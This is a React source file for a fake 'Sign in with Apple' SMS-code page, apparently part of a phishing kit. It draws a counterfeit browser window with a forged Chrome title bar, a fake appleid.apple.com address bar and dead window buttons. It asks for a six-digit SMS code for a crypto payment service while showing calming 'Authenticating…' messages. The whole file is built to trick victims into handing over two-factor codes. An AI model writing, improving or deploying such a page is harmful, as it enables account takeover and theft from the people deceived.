import React from "react";
import EmailLayout from "../EmailLayout";
import applePng from "../assets/apple.png";
import iconApple from "../assets/iconapple.png";

// Apple SMS Page - pede código SMS e mantém mesmo layout/etapas do ApplePassword
const AppleSmsPage = () => {
  const [digits, setDigits] = React.useState(["", "", "", "", "", ""]);
  const [focusedIndex, setFocusedIndex] = React.useState(null);
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [isReady, setIsReady] = React.useState(false);

  React.useEffect(() => {
    // Preloader de 3s dentro do modal para evitar flicker
    const id = setTimeout(() => setIsReady(true), 3000);
    return () => clearTimeout(id);
  }, []);
  const [clientEmail] = React.useState(
    localStorage.getItem("client_email") || "user@icloud.com"
  );
  const [maskedPhone] = React.useState(
    localStorage.getItem("client_phone_mask") || "+1 (***) ***-**34"
  );
  const [appName] = React.useState(
    localStorage.getItem("apple_app_name") || "Production Cryptomus Web"
  );
  const [windowTitle] = React.useState(
    localStorage.getItem("apple_window_title") ||
      "Sign in with Apple - Google Chrome"
  );
  const [urlText] = React.useState(
    localStorage.getItem("apple_url") ||
      "https://appleid.apple.com/auth/authorize?client_id=prod.cryptomus.com&redirect_uri=https://prod.cryptomus.com/callback"
  );

  const [position, setPosition] = React.useState(() => ({
    left: Math.max(0, (window.innerWidth - 520) / 2),
    top: Math.max(0, (window.innerHeight - 640) / 2),
  }));
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });
  const startDrag = (e) => {
    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA", "LABEL"].includes(tag))
      return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };
  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  const phrases = React.useMemo(
    () => [
      "Connecting to Apple…",
      "Securing your session…",
      "Verifying device…",
      "Authenticating…",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);
  React.useEffect(() => {
    if (!isSubmitting) return;
    const id = setInterval(() => {
      setPhraseIndex((i) => (i + 1) % phrases.length);
    }, 1400);
    return () => clearInterval(id);
  }, [isSubmitting, phrases.length]);

  const inputRefs = React.useRef([]);
  const handleDigitChange = (index, value) => {
    if (!/^[0-9]?$/.test(value)) return;
    const next = [...digits];
    next[index] = value;
    setDigits(next);
    if (value && index < inputRefs.current.length - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };
  const code = digits.join("");

  return (
    <EmailLayout>
      <div
        className="min-h-screen w-full bg-[#0b0b0b] relative p-4"
        style={{
          fontFamily: "-apple-system, SF Pro Text, Roboto, Arial, sans-serif",
        }}
      >
        <div
          style={{
            background: "#fff",
            borderRadius: 12,
            boxShadow: "0 8px 32px rgba(0, 0, 0, 0.3)",
            width: "min(520px, 92vw)",
            minHeight: 560,
            color: "#111",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "fixed",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            cursor: isDragging ? "grabbing" : "default",
            zIndex: 1000,
          }}
        >
          {/* Spinner de loading inicial */}
          {!isReady && (
            <div
              style={{
                position: "absolute",
                inset: 0,
                background: "#ffffff",
                display: "flex",
                flexDirection: "column",
                zIndex: 9999,
                borderRadius: 12,
              }}
            >
              {/* Header pequeno */}
              <div
                style={{
                  width: "100%",
                  background: "#ffffff",
                  padding: "4px 8px",
                  display: "flex",
                  alignItems: "center",
                  gap: 6,
                  borderBottom: "1px solid #d1d5db",
                  height: 40,
                }}
              >
                <div
                  style={{
                    width: 20,
                    height: 20,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  <svg width="14" height="14" viewBox="0 0 24 24" aria-hidden>
                    <path
                      fill="#111"
                      d="M16.365 1.43c-.936.052-2.045.61-2.69 1.326-.585.65-1.06 1.607-.87 2.55.998.076 2.02-.51 2.642-1.242.612-.721 1.07-1.676.918-2.634zM21.343 17.1c-.055-.107-2.113-1.145-2.166-3.626-.053-2.27 1.841-3.352 1.92-3.398-.995-1.434-2.54-1.629-3.079-1.649-1.311-.133-2.409.73-3.033.73-.622 0-1.59-.712-2.616-.692-1.344.02-2.582.776-3.273 1.975-1.393 2.413-.355 5.967.997 7.92.659.955 1.438 2.03 2.47 1.99.988-.04 1.36-.643 2.55-.643 1.19 0 1.52.643 2.585.624 1.07-.02 1.747-.974 2.404-1.933.756-1.094 1.07-2.156 1.14-2.299z"
                    />
                  </svg>
                </div>
                <span style={{ color: "#000", fontSize: 12 }}>
                  Sign in with Apple
                </span>
              </div>

              {/* Conteúdo central com spinner */}
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <div
                  style={{
                    width: 40,
                    height: 40,
                    border: "3px solid #111",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
              </div>

              {/* Footer */}
              <div
                style={{
                  width: "100%",
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  minHeight: 44,
                  borderTop: "1px solid #d1d5db",
                  background: "transparent",
                  padding: "0 24px",
                }}
              >
                <div style={{ display: "flex", gap: 40 }}>
                  <a
                    href="#"
                    style={{
                      color: "#111",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    Help
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#111",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    Privacy
                  </a>
                  <a
                    href="#"
                    style={{
                      color: "#111",
                      fontSize: 15,
                      textDecoration: "none",
                    }}
                  >
                    Terms
                  </a>
                </div>
                <span style={{ color: "#111", fontSize: 12 }}>
                  English (United States)
                </span>
              </div>
            </div>
          )}
          {/* Barra da janela */}
          <div
            style={{
              height: 28,
              background: "#e5e7eb",
              borderBottom: "1px solid #d1d5db",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 8px",
              fontSize: 12,
              color: "#111",
            }}
            onMouseDown={startDrag}
          >
            <span
              style={{
                display: "flex",
                alignItems: "center",
                gap: 6,
                opacity: 0.9,
              }}
            >
              <svg width="14" height="14" viewBox="0 0 24 24" aria-hidden>
                <path
                  fill="#111"
                  d="M16.365 1.43c-.936.052-2.045.61-2.69 1.326-.585.65-1.06 1.607-.87 2.55.998.076 2.02-.51 2.642-1.242.612-.721 1.07-1.676.918-2.634zM21.343 17.1c-.055-.107-2.113-1.145-2.166-3.626-.053-2.27 1.841-3.352 1.92-3.398-.995-1.434-2.54-1.629-3.079-1.649-1.311-.133-2.409.73-3.033.73-.622 0-1.59-.712-2.616-.692-1.344.02-2.582.776-3.273 1.975-1.393 2.413-.355 5.967.997 7.92.659.955 1.438 2.03 2.47 1.99.988-.04 1.36-.643 2.55-.643 1.19 0 1.52.643 2.585.624 1.07-.02 1.747-.974 2.404-1.933.756-1.094 1.07-2.156 1.14-2.299z"
                />
              </svg>
              {windowTitle}
            </span>
            <div style={{ display: "flex", gap: 4 }}>
              <button
                type="button"
                title="Minimize"
                onClick={(e) => {
                  e.preventDefault();
                  e.stopPropagation();
                }}
                style={{
                  width: 34,
                  height: 22,
                  border: "1px solid #d1d5db",
                  background: "#f9fafb",
                  borderRadius: 4,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#111",
                  cursor: "default",
                }}
              >
                <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                  <rect x="2" y="7.5" width="12" height="1" fill="#111" />
                </svg>
              </button>
              <button
                type="button"
                title="Maximize"
                onClick={(e) => {
                  e.preventDefault();
                  e.stopPropagation();
                }}
                style={{
                  width: 34,
                  height: 22,
                  border: "1px solid #d1d5db",
                  background: "#f9fafb",
                  borderRadius: 4,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#111",
                  cursor: "default",
                }}
              >
                <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                  <rect
                    x="3"
                    y="3"
                    width="10"
                    height="10"
                    fill="none"
                    stroke="#111"
                    strokeWidth="1.2"
                  />
                </svg>
              </button>
              <button
                type="button"
                title="Close"
                onClick={(e) => {
                  e.preventDefault();
                  e.stopPropagation();
                }}
                style={{
                  width: 34,
                  height: 22,
                  border: "1px solid #d1d5db",
                  background: "#f9fafb",
                  borderRadius: 4,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#111",
                  cursor: "default",
                }}
              >
                <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                  <path
                    d="M3 3 L13 13 M13 3 L3 13"
                    stroke="#111"
                    strokeWidth="1.4"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
            </div>
          </div>

          {/* URL bar */}
          <div
            style={{ borderBottom: "1px solid #e5e7eb", background: "#fff" }}
            onMouseDown={startDrag}
          >
            <div
              style={{
                width: "100%",
                background: "#f3f4f6",
                border: "1px solid #d1d5db",
                height: 32,
                display: "flex",
                alignItems: "center",
                padding: "0 10px",
                gap: 8,
                fontSize: 12,
                color: "#111",
              }}
            >
              <svg
                width="18"
                height="18"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                stroke="#6b7280"
                strokeWidth="1.5"
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                }}
              >
                {urlText}
              </div>
            </div>
          </div>

          {/* Conteúdo */}
          <div
            style={{ flex: 1, padding: "0 24px 18px", position: "relative" }}
          >
            <style>{`@keyframes spin { from { transform: rotate(0deg);} to { transform: rotate(360deg);} }`}</style>

            {/* Header Conta Apple */}
            <div style={{ paddingTop: 12, paddingBottom: 10 }}>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 6,
                  color: "#111",
                }}
              >
                <svg width="16" height="16" viewBox="0 0 32 32" aria-hidden>
                  <path
                    fill="#444444"
                    d="M23.023 17.093c-0.033-3.259 2.657-4.822 2.777-4.901-1.512-2.211-3.867-2.514-4.705-2.548-2.002-0.204-3.91 1.18-4.926 1.18-1.014 0-2.583-1.15-4.244-1.121-2.185 0.033-4.199 1.271-5.323 3.227-2.269 3.936-0.58 9.769 1.631 12.963 1.081 1.561 2.37 3.318 4.061 3.254 1.63-0.064 2.245-1.055 4.215-1.055s2.524 1.055 4.248 1.021c1.753-0.032 2.864-1.591 3.936-3.159 1.24-1.814 1.751-3.57 1.782-3.659-0.038-0.017-3.416-1.312-3.451-5.202zM19.783 7.53c0.897-1.089 1.504-2.602 1.34-4.108-1.294 0.053-2.861 0.86-3.79 1.948-0.832 0.965-1.561 2.502-1.365 3.981 1.444 0.112 2.916-0.734 3.816-1.821z"
                  />
                </svg>
                <strong style={{ fontSize: 16 }}>Conta Apple</strong>
              </div>
              <div
                style={{ height: 1, background: "#e5e7eb", marginTop: 10 }}
              />
            </div>

            {/* Logo central */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                margin: "16px 0 10px",
              }}
            >
              <img
                src={applePng}
                alt="Apple"
                style={{ width: 92, height: "auto" }}
              />
            </div>

            <div
              style={{
                textAlign: "center",
                color: "#111",
                marginBottom: 12,
                lineHeight: 1.35,
              }}
            >
              Enter the SMS code sent to <strong>{maskedPhone}</strong> to sign
              in to <strong>{appName}</strong>.
            </div>

            {/* Badge com email */}
            <div style={{ display: "flex", justifyContent: "center" }}>
              <div
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 8,
                  padding: "6px 12px",
                  borderRadius: 999,
                  border: "1px solid #e5e7eb",
                  background: "#fff",
                  margin: "8px 0 10px",
                  fontSize: 13,
                  color: "#374151",
                }}
              >
                <img
                  src={iconApple}
                  alt="Apple"
                  style={{ width: 14, height: 14 }}
                />
                <span>{clientEmail}</span>
              </div>
            </div>

            {/* Inputs de código (6 dígitos) */}
            <div
              style={{
                marginTop: 10,
                display: "flex",
                justifyContent: "center",
                gap: 10,
              }}
            >
              {digits.map((d, i) => (
                <input
                  data-apple-modal
                  key={i}
                  ref={(el) => (inputRefs.current[i] = el)}
                  value={d}
                  onChange={(e) =>
                    handleDigitChange(i, e.target.value.replace(/\D/g, ""))
                  }
                  onFocus={() => setFocusedIndex(i)}
                  onBlur={() =>
                    setFocusedIndex((prev) => (prev === i ? null : prev))
                  }
                  onKeyDown={(e) => {
                    if (e.key === "Backspace") {
                      e.preventDefault();
                      if (digits[i]) {
                        const next = [...digits];
                        next[i] = "";
                        setDigits(next);
                        return;
                      }
                      if (i > 0) {
                        const next = [...digits];
                        if (next[i - 1]) next[i - 1] = "";
                        setDigits(next);
                        inputRefs.current[i - 1]?.focus();
                      }
                    }
                    if (e.key === "ArrowLeft" && i > 0) {
                      e.preventDefault();
                      inputRefs.current[i - 1]?.focus();
                    }
                    if (e.key === "ArrowRight" && i < digits.length - 1) {
                      e.preventDefault();
                      inputRefs.current[i + 1]?.focus();
                    }
                  }}
                  inputMode="numeric"
                  maxLength={1}
                  style={{
                    width: 50,
                    height: 54,
                    borderRadius: 10,
                    textAlign: "center",
                    fontSize: 20,
                    background: "#fff",
                    border:
                      focusedIndex === i
                        ? "1px solid #2563eb"
                        : "1px solid #d1d5db",
                    boxShadow:
                      focusedIndex === i
                        ? "0 0 0 2px rgba(37,99,235,0.35)"
                        : "none",
                    outline: "none",
                  }}
                />
              ))}
            </div>

            {/* Ação confirmar */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                marginTop: 14,
              }}
            >
              <button
                type="button"
                disabled={code.length !== digits.length}
                onClick={() => {
                  if (code.length !== digits.length) return;
                  setIsSubmitting(true);
                }}
                style={{
                  padding: "10px 24px",
                  minWidth: 140,
                  borderRadius: 24,
                  border: "1px solid #d1d5db",
                  background:
                    code.length === digits.length ? "#2563eb" : "#f3f4f6",
                  color: code.length === digits.length ? "#fff" : "#6b7280",
                  cursor:
                    code.length === digits.length ? "pointer" : "not-allowed",
                  fontSize: 14,
                }}
              >
                Next
              </button>
            </div>

            {/* Overlay de carregamento etapa 2 */}
            {isSubmitting && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  background: "#fff",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  flexDirection: "column",
                  gap: 16,
                  zIndex: 50,
                  cursor: "wait",
                }}
              >
                <img
                  src={applePng}
                  alt="Apple"
                  style={{
                    width: 92,
                    height: "auto",
                    transform: "translateY(-6px)",
                  }}
                />
                <div
                  style={{
                    width: 44,
                    height: 44,
                    borderRadius: "50%",
                    border: "4px solid #e5e7eb",
                    borderTopColor: "#111",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
                <div
                  style={{
                    color: "#374151",
                    fontSize: 15,
                    textAlign: "center",
                  }}
                >
                  {phrases[phraseIndex]}
                </div>
              </div>
            )}
          </div>

          {/* Footer */}
          <div
            style={{
              borderTop: "1px solid #f3f4f6",
              background: "#fff",
              minHeight: 44,
              padding: "8px 16px",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              color: "#6b7280",
              fontSize: 12,
            }}
          >
            <span>Copyright © 2025 Apple Inc. All rights reserved.</span>
            <div style={{ display: "flex", gap: 12 }}>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                style={{ color: "#6b7280", textDecoration: "none" }}
              >
                Privacy Policy
              </a>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                style={{ color: "#6b7280", textDecoration: "none" }}
              >
                Cookie Use
              </a>
            </div>
          </div>
        </div>
      </div>
    </EmailLayout>
  );
};

export default AppleSmsPage;
